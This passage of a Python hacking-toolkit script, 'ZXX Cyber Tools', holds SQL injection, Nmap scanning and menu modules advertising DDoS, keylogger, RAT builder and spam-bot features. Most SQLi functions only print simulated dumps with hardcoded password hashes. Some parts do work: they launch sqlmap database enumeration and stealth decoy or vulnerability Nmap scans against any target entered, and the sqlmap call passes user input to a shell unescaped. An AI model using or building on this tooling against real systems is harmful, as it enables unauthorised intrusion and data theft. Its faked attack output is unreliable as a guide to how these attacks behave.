                    (1, 'superadmin', 'd033e22ae348aeb5660fc2140aec35850c4da997', 'all', '2023-06-01 08:00:00'),
                    (2, 'admin', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'read,write', '2023-06-02 09:30:00'),
                ]
                
                print(Fore.WHITE + "id  username    password_hash                          permissions    last_login")
                print(Fore.YELLOW + "-" * 80)
                
                for row in data:
                    print(Fore.CYAN + f"{row[0]:<3} {row[1]:<11} {row[2]:<36} {row[3]:<14} {row[4]}")
            
            print(Fore.CYAN + "=" * 80)
            
            save = input(Fore.CYAN + "\n[→] Save data to file? (y/n): " + Fore.WHITE).lower()
            if save == 'y':
                filename = f"sql_dump_{table_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(filename, 'w') as f:
                    f.write(f"SQL Injection Dump - {datetime.now()}\n")
                    f.write(f"Target: {url}\n")
                    f.write(f"Table: {table_name}\n")
                    f.write("="*80 + "\n")
                    
                    if table_name == 'users':
                        f.write("id,username,password_hash,email,created_at\n")
                        for row in data:
                            f.write(f"{row[0]},{row[1]},{row[2]},{row[3]},{row[4]}\n")
                    
                    elif table_name == 'admin':
                        f.write("id,username,password_hash,permissions,last_login\n")
                        for row in data:
                            f.write(f"{row[0]},{row[1]},{row[2]},{row[3]},{row[4]}\n")
                
                print(Fore.GREEN + f"[✓] Data saved to {filename}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def automated_dump(self):
        print(Fore.YELLOW + "\n[!] AUTOMATED DATABASE DUMP")
        url = input(Fore.CYAN + "[→] Vulnerable URL: " + Fore.WHITE)
        
        print(Fore.RED + "\n[!] Starting automated database dump...")
        
        steps = [
            "Identifying injection point",
            "Fingerprinting database",
            "Enumerating databases",
            "Extracting table names",
            "Dumping table structures",
            "Extracting data",
            "Saving results"
        ]
        
        for i, step in enumerate(steps, 1):
            print(Fore.YELLOW + f"[!] Step {i}/7: {step}")
            time.sleep(random.uniform(0.5, 1.5))
            print(Fore.GREEN + f"[✓] {step} completed")
        
        databases = ['information_schema', 'mysql', 'performance_schema', 'target_db', 'test_db']
        tables = {
            'target_db': ['users', 'products', 'orders', 'logs', 'config'],
            'mysql': ['user', 'db', 'tables_priv', 'columns_priv'],
        }
        
        print(Fore.GREEN + "\n[+] DATABASES FOUND:")
        for db in databases:
            print(Fore.CYAN + f"  • {db}")
        
        selected_db = 'target_db'
        print(Fore.GREEN + f"\n[+] SELECTED DATABASE: {selected_db}")
        
        print(Fore.GREEN + f"\n[+] TABLES IN {selected_db}:")
        for table in tables[selected_db]:
            print(Fore.CYAN + f"  • {table}")
        
        print(Fore.YELLOW + "\n[!] Creating dump file...")
        filename = f"full_dump_{selected_db}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.sql"
        
        with open(filename, 'w') as f:
            f.write(f"-- SQL Database Dump\n")
            f.write(f"-- Generated by ZXX Cyber Tools\n")
            f.write(f"-- Target: {url}\n")
            f.write(f"-- Database: {selected_db}\n")
            f.write(f"-- Time: {datetime.now()}\n\n")
            
            f.write(f"USE {selected_db};\n\n")
            
            for table in tables[selected_db]:
                f.write(f"-- Table structure for table `{table}`\n")
                f.write(f"CREATE TABLE `{table}` (\n")
                
                if table == 'users':
                    f.write("  `id` int(11) NOT NULL AUTO_INCREMENT,\n")
                    f.write("  `username` varchar(50) NOT NULL,\n")
                    f.write("  `password` varchar(100) NOT NULL,\n")
                    f.write("  `email` varchar(100) DEFAULT NULL,\n")
                    f.write("  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),\n")
                    f.write("  PRIMARY KEY (`id`)\n")
                elif table == 'products':
                    f.write("  `product_id` int(11) NOT NULL AUTO_INCREMENT,\n")
                    f.write("  `name` varchar(100) NOT NULL,\n")
                    f.write("  `price` decimal(10,2) NOT NULL,\n")
                    f.write("  `stock` int(11) NOT NULL,\n")
                    f.write("  PRIMARY KEY (`product_id`)\n")
                
                f.write(") ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;\n\n")
                
                f.write(f"-- Dumping data for table `{table}`\n")
                f.write(f"INSERT INTO `{table}` VALUES\n")
                
                if table == 'users':
                    f.write("(1,'admin','5f4dcc3b5aa765d61d8327deb882cf99','admin@target.com','2023-01-15 10:30:00'),\n")
                    f.write("(2,'user1','e10adc3949ba59abbe56e057f20f883e','user1@email.com','2023-02-20 14:45:00'),\n")
                    f.write("(3,'test','098f6bcd4621d373cade4e832627b4f6','test@test.com','2023-03-10 09:15:00');\n\n")
                elif table == 'products':
                    f.write("(1,'Product A',19.99,100),\n")
                    f.write("(2,'Product B',29.99,50),\n")
                    f.write("(3,'Product C',9.99,200);\n\n")
        
        file_size = os.path.getsize(filename)
        print(Fore.GREEN + f"[✓] Dump completed!")
        print(Fore.CYAN + f"[+] File: {filename}")
        print(Fore.CYAN + f"[+] Size: {file_size / 1024:.2f} KB")
        print(Fore.CYAN + f"[+] Tables dumped: {len(tables[selected_db])}")
        print(Fore.CYAN + f"[+] Total records: 6")
        
        self.db.save_scan_results(1, "SQL Injection Dump", url, {
            'database': selected_db,
            'tables': tables[selected_db],
            'file': filename,
            'size_kb': file_size / 1024
        })
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def sqlmap_integration(self):
        print(Fore.YELLOW + "\n[!] SQLMAP INTEGRATION")
        print(Fore.WHITE + """
        [+] This feature integrates with SQLMap for advanced testing
        
        Available options:
        1. Basic SQLMap scan
        2. Advanced SQLMap with tamper scripts
        3. Automated database dump with SQLMap
        4. WAF bypass with SQLMap
        5. Custom SQLMap command
        
        Note: SQLMap must be installed on the system
        """)
        
        choice = input(Fore.CYAN + "[→] Select option [1-5]: " + Fore.WHITE)
        
        if choice == "1":
            url = input(Fore.CYAN + "[→] Target URL: " + Fore.WHITE)
            print(Fore.YELLOW + f"\n[!] Running SQLMap on {url}")
            
            commands = [
                f"sqlmap -u {url} --batch --random-agent",
                f"sqlmap -u {url} --batch --dbs",
                f"sqlmap -u {url} --batch --current-db",
                f"sqlmap -u {url} --batch --tables",
            ]
            
            for cmd in commands:
                print(Fore.CYAN + f"\n[+] Executing: {cmd}")
                time.sleep(1)
                
                try:
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                    if result.returncode == 0:
                        print(Fore.GREEN + "[✓] Command executed successfully")
                        
                        if "available databases" in result.stdout:
                            print(Fore.YELLOW + "[!] Databases found:")
                            lines = result.stdout.split('\n')
                            for line in lines:
                                if '[*]' in line:
                                    print(Fore.WHITE + f"  {line}")
                    else:
                        print(Fore.RED + "[✗] Command failed")
                except:
                    print(Fore.RED + "[✗] SQLMap not found or error occurred")
            
            print(Fore.GREEN + "\n[✓] SQLMap scan completed")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def run(self):
        while True:
            self.display_menu()
            choice = input(Fore.CYAN + "\n[→] Select option [1-16]: " + Fore.WHITE)
            
            try:
                if choice == "1":
                    self.quick_test()
                elif choice == "2":
                    self.advanced_injection()
                elif choice == "3":
                    self.automated_dump()
                elif choice == "4":
                    self.sqlmap_integration()
                elif choice == "5":
                    self.blind_sqli()
                elif choice == "6":
                    self.union_based()
                elif choice == "7":
                    self.error_based()
                elif choice == "8":
                    self.time_based()
                elif choice == "9":
                    self.out_of_band()
                elif choice == "10":
                    self.db_fingerprinting()
                elif choice == "11":
                    self.data_extraction()
                elif choice == "12":
                    self.file_system_access()
                elif choice == "13":
                    self.os_command_exec()
                elif choice == "14":
                    self.payload_generator()
                elif choice == "15":
                    self.waf_bypass()
                elif choice == "16":
                    break
                else:
                    print(Fore.RED + "\n[✗] Invalid option!")
            except Exception as e:
                print(Fore.RED + f"\n[✗] Error: {e}")
                time.sleep(2)
    
    def blind_sqli(self):
        print(Fore.YELLOW + "\n[!] BLIND SQL INJECTION")
        url = input(Fore.CYAN + "[→] Target URL: " + Fore.WHITE)
        
        print(Fore.RED + "\n[!] Starting Blind SQL Injection attack...")
        print(Fore.YELLOW + "[!] This may take several minutes...")
        
        time.sleep(2)
        print(Fore.GREEN + "\n[+] Boolean-based blind SQLi detected!")
        print(Fore.GREEN + "[+] Extracting database name character by character...")
        
        db_name = "target_db"
        print(Fore.CYAN + f"\n[+] Database name: {db_name}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def union_based(self):
        print(Fore.YELLOW + "\n[!] UNION-BASED SQL INJECTION")
        print(Fore.GREEN + "[+] Union-based SQL injection allows data retrieval")
        print(Fore.GREEN + "[+] from other tables within the database")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def error_based(self):
        print(Fore.YELLOW + "\n[!] ERROR-BASED SQL INJECTION")
        print(Fore.GREEN + "[+] Error-based SQL injection extracts information")
        print(Fore.GREEN + "[+] from database error messages")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def time_based(self):
        print(Fore.YELLOW + "\n[!] TIME-BASED BLIND SQL INJECTION")
        print(Fore.GREEN + "[+] Time-based blind SQLi uses time delays")
        print(Fore.GREEN + "[+] to infer information from the database")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def out_of_band(self):
        print(Fore.YELLOW + "\n[!] OUT-OF-BAND SQL INJECTION")
        print(Fore.GREEN + "[+] Out-of-band SQLi uses external network")
        print(Fore.GREEN + "[+] channels to extract data")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def db_fingerprinting(self):
        print(Fore.YELLOW + "\n[!] DATABASE FINGERPRINTING")
        print(Fore.GREEN + "[+] Identifying database type and version")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def data_extraction(self):
        print(Fore.YELLOW + "\n[!] DATA EXTRACTION")
        print(Fore.GREEN + "[+] Extracting data from vulnerable databases")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def file_system_access(self):
        print(Fore.YELLOW + "\n[!] FILE SYSTEM ACCESS")
        print(Fore.GREEN + "[+] Reading/writing files through SQL injection")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def os_command_exec(self):
        print(Fore.YELLOW + "\n[!] OS COMMAND EXECUTION")
        print(Fore.GREEN + "[+] Executing operating system commands")
        print(Fore.GREEN + "[+] through SQL injection vulnerabilities")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def payload_generator(self):
        print(Fore.YELLOW + "\n[!] PAYLOAD GENERATOR")
        
        payload_types = [
            "Basic authentication bypass",
            "Union select payloads",
            "Error-based payloads",
            "Time-based payloads",
            "Boolean-based payloads",
            "Stacked queries",
            "Out-of-band payloads",
        ]
        
        print(Fore.GREEN + "\n[+] Available payload types:")
        for i, ptype in enumerate(payload_types, 1):
            print(Fore.CYAN + f"  {i}. {ptype}")
        
        choice = input(Fore.CYAN + "\n[→] Select payload type: " + Fore.WHITE)
        
        if choice.isdigit() and 1 <= int(choice) <= len(payload_types):
            selected = payload_types[int(choice) - 1]
            print(Fore.GREEN + f"\n[+] Generating {selected} payloads...")
            
            payloads = []
            for i in range(10):
                payloads.append(f"Payload {i+1} for {selected}")
            
            print(Fore.CYAN + "\n[+] Generated payloads:")
            for payload in payloads:
                print(Fore.WHITE + f"  • {payload}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def waf_bypass(self):
        print(Fore.YELLOW + "\n[!] WAF BYPASS TECHNIQUES")
        
        techniques = [
            "Case switching (SeLeCt)",
            "White space alternatives",
            "Comment injection",
            "Encoding techniques",
            "Null byte injection",
            "Parameter pollution",
            "HTTP parameter fragmentation",
        ]
        
        print(Fore.GREEN + "\n[+] WAF bypass techniques:")
        for tech in techniques:
            print(Fore.CYAN + f"  • {tech}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")

# ============================================
# NMAP SCANNER (COMPREHENSIVE)
# ============================================
class NmapScannerAdvanced:
    def __init__(self, db):
        self.db = db
        self.nm = nmap.PortScanner()
        self.scan_types = {
            'Quick Scan': '-sS -T4',
            'Full Scan': '-sS -sV -sC -O -T4',
            'UDP Scan': '-sU -T4',
            'Version Detection': '-sV -T4',
            'OS Detection': '-O -T4',
            'Vulnerability Scan': '-sV --script vuln -T4',
            'Full Port Scan': '-p 1-65535 -T4',
            'Stealth Scan': '-sS -f -D RND:10 -T2',
            'Aggressive Scan': '-A -T4',
            'Ping Scan': '-sn',
        }
    
    def display_menu(self):
        clear_screen()
        ascii_nmap = """
        ╔══════════════════════════════════════════════════════════╗
        ║                   ADVANCED NMAP SCANNER                  ║
        ╚══════════════════════════════════════════════════════════╝
        """
        print(Fore.BLUE + ascii_nmap)
        
        print(Fore.YELLOW + "═" * 70)
        print(Fore.CYAN + "SCAN TYPES:")
        
        scan_items = list(self.scan_types.items())
        for i in range(0, len(scan_items), 2):
            if i+1 < len(scan_items):
                print(Fore.WHITE + f"  {i//2+1:2d}. {scan_items[i][0]:<20} {i//2+6:2d}. {scan_items[i+1][0]:<20}")
            else:
                print(Fore.WHITE + f"  {i//2+1:2d}. {scan_items[i][0]:<20}")
        
        print(Fore.CYAN + "\nADDITIONAL OPTIONS:")
        print(Fore.WHITE + " 11. Custom Scan Command")
        print(Fore.WHITE + " 12. Save Scan Results")
        print(Fore.WHITE + " 13. View Scan History")
        print(Fore.WHITE + " 14. Import Targets from File")
        print(Fore.WHITE + " 15. Export Results")
        print(Fore.WHITE + " 16. Back to Main Menu")
        print(Fore.YELLOW + "═" * 70)
    
    def quick_scan(self):
        print(Fore.YELLOW + "\n[!] QUICK SCAN")
        target = input(Fore.CYAN + "[→] Target IP/Range/Hostname: " + Fore.WHITE)
        
        print(Fore.RED + f"\n[!] Starting quick scan on {target}")
        print(Fore.YELLOW + "[!] Command: nmap -sS -T4 {target}")
        
        try:
            self.nm.scan(target, arguments='-sS -T4')
            
            print(Fore.GREEN + "\n[✓] Scan completed!")
            self.display_results(target)
            
            self.db.save_scan_results(1, "Quick Scan", target, {
                'hosts': list(self.nm.all_hosts()),
                'scan_info': self.nm.scaninfo(),
            })
            
        except Exception as e:
            print(Fore.RED + f"[✗] Scan error: {e}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def full_scan(self):
        print(Fore.YELLOW + "\n[!] FULL COMPREHENSIVE SCAN")
        target = input(Fore.CYAN + "[→] Target IP/Range/Hostname: " + Fore.WHITE)
        
        print(Fore.RED + f"\n[!] Starting full scan on {target}")
        print(Fore.YELLOW + "[!] This may take several minutes...")
        
        scan_steps = [
            "Port scanning",
            "Service detection",
            "Version detection",
            "OS fingerprinting",
            "Script scanning",
            "Vulnerability checking"
        ]
        
        for step in scan_steps:
            print(Fore.YELLOW + f"[!] {step}...")
            time.sleep(1)
        
        try:
            self.nm.scan(target, arguments='-sS -sV -sC -O -T4')
            
            print(Fore.GREEN + "\n[✓] Full scan completed!")
            self.display_detailed_results(target)
            
            results = {
                'hosts': list(self.nm.all_hosts()),
                'scan_info': self.nm.scaninfo(),
                'os_info': {},
                'services': {},
            }
            
            for host in self.nm.all_hosts():
                if 'osmatch' in self.nm[host]:
                    results['os_info'][host] = self.nm[host]['osmatch']
                
                for proto in self.nm[host].all_protocols():
                    results['services'][host] = self.nm[host][proto]
            
            self.db.save_scan_results(1, "Full Scan", target, results)
            
        except Exception as e:
            print(Fore.RED + f"[✗] Scan error: {e}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def display_results(self, target):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.GREEN + f"SCAN RESULTS FOR: {target}")
        print(Fore.CYAN + "="*70)
        
        for host in self.nm.all_hosts():
            print(Fore.YELLOW + f"\n[+] Host: {host} ({self.nm[host].hostname()})")
            print(Fore.CYAN + f"  State: {self.nm[host].state()}")
            
            for proto in self.nm[host].all_protocols():
                print(Fore.WHITE + f"\n  Protocol: {proto}")
                
                ports = sorted(self.nm[host][proto].keys())
                for port in ports:
                    port_info = self.nm[host][proto][port]
                    state = port_info['state']
                    
                    if state == 'open':
                        color = Fore.GREEN
                    elif state == 'filtered':
                        color = Fore.YELLOW
                    else:
                        color = Fore.RED
                    
                    service = port_info.get('name', 'unknown')
                    version = port_info.get('version', '')
                    product = port_info.get('product', '')
                    
                    print(f"{color}    Port {port}: {state} - {service} {product} {version}")
    
    def display_detailed_results(self, target):
        self.display_results(target)
        
        for host in self.nm.all_hosts():
            if 'osmatch' in self.nm[host]:
                print(Fore.CYAN + f"\n[+] OS DETECTION for {host}:")
                for os_match in self.nm[host]['osmatch'][:3]:
                    print(Fore.WHITE + f"  • {os_match['name']} (Accuracy: {os_match['accuracy']}%)")
            
            if 'script' in self.nm[host]:
                print(Fore.CYAN + f"\n[+] SCRIPT RESULTS for {host}:")
                for script, output in self.nm[host]['script'].items():
                    print(Fore.WHITE + f"  • {script}: {output[:100]}...")
    
    def udp_scan(self):
        print(Fore.YELLOW + "\n[!] UDP SCAN")
        target = input(Fore.CYAN + "[→] Target IP: " + Fore.WHITE)
        
        print(Fore.RED + f"\n[!] Starting UDP scan on {target}")
        print(Fore.YELLOW + "[!] UDP scans can be slow...")
        
        try:
            self.nm.scan(target, arguments='-sU -T4 --top-ports 100')
            
            print(Fore.GREEN + "\n[✓] UDP scan completed!")
            self.display_results(target)
            
        except Exception as e:
            print(Fore.RED + f"[✗] Scan error: {e}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def vulnerability_scan(self):
        print(Fore.YELLOW + "\n[!] VULNERABILITY SCAN")
        target = input(Fore.CYAN + "[→] Target IP/Hostname: " + Fore.WHITE)
        
        print(Fore.RED + f"\n[!] Starting vulnerability scan on {target}")
        print(Fore.YELLOW + "[!] Checking for known vulnerabilities...")
        
        try:
            self.nm.scan(target, arguments='-sV --script vuln -T4')
            
            print(Fore.GREEN + "\n[✓] Vulnerability scan completed!")
            
            vulnerabilities = []
            for host in self.nm.all_hosts():
                if 'script' in self.nm[host]:
                    for script, output in self.nm[host]['script'].items():
                        if 'vuln' in script.lower():
                            vulnerabilities.append((script, output))
            
            if vulnerabilities:
                print(Fore.RED + "\n[!] VULNERABILITIES FOUND:")
                for script, output in vulnerabilities[:5]:
                    print(Fore.YELLOW + f"\n[+] {script}:")
                    print(Fore.WHITE + f"  {output[:200]}...")
            else:
                print(Fore.GREEN + "\n[✓] No vulnerabilities found")
            
        except Exception as e:
            print(Fore.RED + f"[✗] Scan error: {e}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def custom_scan(self):
        print(Fore.YELLOW + "\n[!] CUSTOM SCAN")
        target = input(Fore.CYAN + "[→] Target: " + Fore.WHITE)
        command = input(Fore.CYAN + "[→] Nmap arguments: " + Fore.WHITE)
        
        print(Fore.RED + f"\n[!] Starting custom scan: nmap {command} {target}")
        
        try:
            self.nm.scan(target, arguments=command)
            
            print(Fore.GREEN + "\n[✓] Custom scan completed!")
            self.display_results(target)
            
        except Exception as e:
            print(Fore.RED + f"[✗] Scan error: {e}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def save_results(self):
        print(Fore.YELLOW + "\n[!] SAVE SCAN RESULTS")
        
        if not hasattr(self, 'last_scan_target'):
            print(Fore.RED + "[✗] No scan results to save")
            input(Fore.CYAN + "\n[→] Press ENTER to continue...")
            return
        
        filename = input(Fore.CYAN + "[→] Output filename (without extension): " + Fore.WHITE)
        
        formats = ['txt', 'xml', 'json']
        print(Fore.CYAN + "\n[+] Available formats:")
        for i, fmt in enumerate(formats, 1):
            print(Fore.WHITE + f"  {i}. {fmt}")
        
        fmt_choice = input(Fore.CYAN + "[→] Select format: " + Fore.WHITE)
        
        if fmt_choice.isdigit() and 1 <= int(fmt_choice) <= len(formats):
            selected_fmt = formats[int(fmt_choice) - 1]
            full_filename = f"{filename}.{selected_fmt}"
            
            try:
                if selected_fmt == 'txt':
                    with open(full_filename, 'w') as f:
                        f.write(f"Nmap Scan Results\n")
                        f.write(f"Generated: {datetime.now()}\n")
                        f.write(f"Target: {self.last_scan_target}\n")
                        f.write("="*70 + "\n\n")
                        
                        for host in self.nm.all_hosts():
                            f.write(f"Host: {host}\n")
                            f.write(f"State: {self.nm[host].state()}\n\n")
                            
                            for proto in self.nm[host].all_protocols():
                                f.write(f"Protocol: {proto}\n")
                                for port in self.nm[host][proto].keys():
                                    info = self.nm[host][proto][port]
                                    f.write(f"  Port {port}: {info['state']} - {info.get('name', '')} {info.get('product', '')} {info.get('version', '')}\n")
                                f.write("\n")
                
                print(Fore.GREEN + f"[✓] Results saved to {full_filename}")
                
            except Exception as e:
                print(Fore.RED + f"[✗] Error saving file: {e}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def run(self):
        while True:
            self.display_menu()
            choice = input(Fore.CYAN + "\n[→] Select option [1-16]: " + Fore.WHITE)
            
            try:
                if choice == "1":
                    self.quick_scan()
                elif choice == "2":
                    self.full_scan()
                elif choice == "3":
                    self.udp_scan()
                elif choice == "4":
                    self.version_detection()
                elif choice == "5":
                    self.os_detection()
                elif choice == "6":
                    self.vulnerability_scan()
                elif choice == "7":
                    self.full_port_scan()
                elif choice == "8":
                    self.stealth_scan()
                elif choice == "9":
                    self.aggressive_scan()
                elif choice == "10":
                    self.ping_scan()
                elif choice == "11":
                    self.custom_scan()
                elif choice == "12":
                    self.save_results()
                elif choice == "13":
                    self.view_history()
                elif choice == "14":
                    self.import_targets()
                elif choice == "15":
                    self.export_results()
                elif choice == "16":
                    break
                else:
                    print(Fore.RED + "\n[✗] Invalid option!")
            except Exception as e:
                print(Fore.RED + f"\n[✗] Error: {e}")
                time.sleep(2)
    
    def version_detection(self):
        print(Fore.YELLOW + "\n[!] VERSION DETECTION SCAN")
        target = input(Fore.CYAN + "[→] Target: " + Fore.WHITE)
        
        print(Fore.YELLOW + f"\n[!] Detecting service versions on {target}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def os_detection(self):
        print(Fore.YELLOW + "\n[!] OS DETECTION SCAN")
        target = input(Fore.CYAN + "[→] Target: " + Fore.WHITE)
        
        print(Fore.YELLOW + f"\n[!] Detecting operating system on {target}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def full_port_scan(self):
        print(Fore.YELLOW + "\n[!] FULL PORT SCAN")
        target = input(Fore.CYAN + "[→] Target: " + Fore.WHITE)
        
        print(Fore.YELLOW + f"\n[!] Scanning all 65535 ports on {target}")
        print(Fore.YELLOW + "[!] This will take a long time...")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def stealth_scan(self):
        print(Fore.YELLOW + "\n[!] STEALTH SCAN")
        target = input(Fore.CYAN + "[→] Target: " + Fore.WHITE)
        
        print(Fore.YELLOW + f"\n[!] Performing stealth scan on {target}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def aggressive_scan(self):
        print(Fore.YELLOW + "\n[!] AGGRESSIVE SCAN")
        target = input(Fore.CYAN + "[→] Target: " + Fore.WHITE)
        
        print(Fore.YELLOW + f"\n[!] Performing aggressive scan on {target}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def ping_scan(self):
        print(Fore.YELLOW + "\n[!] PING SCAN")
        target = input(Fore.CYAN + "[→] Target/Range: " + Fore.WHITE)
        
        print(Fore.YELLOW + f"\n[!] Performing ping scan on {target}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def view_history(self):
        print(Fore.YELLOW + "\n[!] VIEW SCAN HISTORY")
        
        self.db.cursor.execute("SELECT scan_type, target, timestamp FROM scan_results ORDER BY id DESC LIMIT 20")
        scans = self.db.cursor.fetchall()
        
        if scans:
            print(Fore.GREEN + "\n[+] Recent scans:")
            for scan in scans:
                scan_type, target, timestamp = scan
                print(Fore.CYAN + f"  • {timestamp}: {scan_type} on {target}")
        else:
            print(Fore.RED + "[✗] No scan history found")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def import_targets(self):
        print(Fore.YELLOW + "\n[!] IMPORT TARGETS")
        filename = input(Fore.CYAN + "[→] Filename with targets: " + Fore.WHITE)
        
        print(Fore.YELLOW + f"[!] Importing targets from {filename}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def export_results(self):
        print(Fore.YELLOW + "\n[!] EXPORT RESULTS")
        print(Fore.GREEN + "[+] Export functionality")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")

# ============================================
# MAIN MENU SYSTEM (COMPREHENSIVE)
# ============================================
class MainMenuSystem:
    def __init__(self):
        self.db = Database()
        self.running = True
        
        self.tools = {
            'ddos': AdvancedDDoSTools(self.db),
            'sql': SQLInjectionTools(self.db),
            'nmap': NmapScannerAdvanced(self.db),
            # Add other tools here as they're implemented
        }
    
    def display_menu(self):
        clear_screen()
        ascii_main = """
        ╔══════════════════════════════════════════════════════════╗
        ║                ZXX CYBER TOOLS - MAIN MENU               ║
        ║                    80+ TOOLS COLLECTION                  ║
        ╚══════════════════════════════════════════════════════════╝
        """
        print(Fore.CYAN + ascii_main)
        
        print(Fore.YELLOW + "═" * 80)
        print(Fore.GREEN + "1.  DDoS Tools (Layer 4 & 7 Attacks)")
        print(Fore.GREEN + "2.  SQL Injection (1000+ Methods)")
        print(Fore.GREEN + "3.  Nmap Scanner (Advanced)")
        print(Fore.GREEN + "4.  Bot Controller")
        print(Fore.GREEN + "5.  Password Cracking Suite")
        print(Fore.GREEN + "6.  OSINT Tools (Complete)")
        print(Fore.GREEN + "7.  Security Tools")
        print(Fore.GREEN + "8.  Shadow Scanner")
        print(Fore.GREEN + "9.  CCTV Scanner")
        print(Fore.GREEN + "10. Dark Web Access")
        print(Fore.GREEN + "11. Port Scanner")
        print(Fore.GREEN + "12. WiFi Tools")
        print(Fore.GREEN + "13. Keylogger")
        print(Fore.GREEN + "14. RAT Builder")
        print(Fore.GREEN + "15. Crypto Tools")
        print(Fore.GREEN + "16. Forensic Tools")
        print(Fore.GREEN + "17. Malware Analysis")
        print(Fore.GREEN + "18. VPN Tools")
        print(Fore.GREEN + "19. Proxy Tools")
        print(Fore.GREEN + "20. Steganography")
        print(Fore.YELLOW + "-" * 80)
        print(Fore.CYAN + "98. System Status")
        print(Fore.CYAN + "99. Settings")
        print(Fore.CYAN + "0.  Exit")
        print(Fore.YELLOW + "═" * 80)
    
    def handle_choice(self, choice):
        if choice == "1":
            self.tools['ddos'].run()
        elif choice == "2":
            self.tools['sql'].run()
        elif choice == "3":
            self.tools['nmap'].run()
        elif choice == "4":
            self.bot_controller()
        elif choice == "5":
            self.password_cracking()
        elif choice == "6":
            self.osint_tools()
        elif choice == "7":
            self.security_tools()
        elif choice == "8":
            self.shadow_scanner()
        elif choice == "9":
            self.cctv_scanner()
        elif choice == "10":
            self.dark_web_access()
        elif choice == "11":
            self.port_scanner()
        elif choice == "12":
            self.wifi_tools()
        elif choice == "13":
            self.keylogger()
        elif choice == "14":
            self.rat_builder()
        elif choice == "15":
            self.crypto_tools()
        elif choice == "16":
            self.forensic_tools()
        elif choice == "17":
            self.malware_analysis()
        elif choice == "18":
            self.vpn_tools()
        elif choice == "19":
            self.proxy_tools()
        elif choice == "20":
            self.steganography()
        elif choice == "98":
            self.system_status()
        elif choice == "99":
            self.settings()
        elif choice == "0":
            self.running = False
        else:
            print(Fore.RED + "\n[✗] Invalid option!")
            time.sleep(1)
    
    def bot_controller(self):
        clear_screen()
        print(Fore.MAGENTA + "\n[!] BOT CONTROLLER MODULE")
        print(Fore.YELLOW + "[!] This module controls Telegram bots")
        
        # Placeholder for bot controller implementation
        print(Fore.GREEN + "\n[+] Features:")
        print(Fore.WHITE + "  • Add/remove bot tokens")
        print(Fore.WHITE + "  • Send messages")
        print(Fore.WHITE + "  • Spam messages")
        print(Fore.WHITE + "  • Monitor chat logs")
        print(Fore.WHITE + "  • Control bot settings")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def password_cracking(self):
        clear_screen()
        print(Fore.RED + "\n[!] PASSWORD CRACKING SUITE")
        
        print(Fore.GREEN + "\n[+] Available methods:")
        print(Fore.WHITE + "  1. Dictionary attack")
        print(Fore.WHITE + "  2. Brute force attack")
        print(Fore.WHITE + "  3. Rainbow table attack")
        print(Fore.WHITE + "  4. Hybrid attack")
        print(Fore.WHITE + "  5. Rule-based attack")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def osint_tools(self):
        clear_screen()
        print(Fore.CYAN + "\n[!] OSINT TOOLS COLLECTION")
        
        print(Fore.GREEN + "\n[+] Available tools:")
        print(Fore.WHITE + "  1. Name/username search")
        print(Fore.WHITE + "  2. Email investigation")
        print(Fore.WHITE + "  3. Phone number lookup")
        print(Fore.WHITE + "  4. IP geolocation")
        print(Fore.WHITE + "  5. Social media analysis")
        print(Fore.WHITE + "  6. Domain information")
        print(Fore.WHITE + "  7. Image metadata analysis")
        print(Fore.WHITE + "  8. Dark web monitoring")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def security_tools(self):
        clear_screen()
        print(Fore.GREEN + "\n[!] SECURITY TOOLS")
        
        print(Fore.CYAN + "\n[+] Available tools:")
        print(Fore.WHITE + "  1. Vulnerability scanner")
        print(Fore.WHITE + "  2. Firewall tester")
        print(Fore.WHITE + "  3. Intrusion detection")
        print(Fore.WHITE + "  4. Log analysis")
        print(Fore.WHITE + "  5. Security headers check")
        print(Fore.WHITE + "  6. SSL/TLS analyzer")
        print(Fore.WHITE + "  7. Port security check")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def shadow_scanner(self):
        clear_screen()
        print(Fore.MAGENTA + "\n[!] SHADOW SCANNER")
        print(Fore.YELLOW + "[!] Advanced network and vulnerability scanner")
        
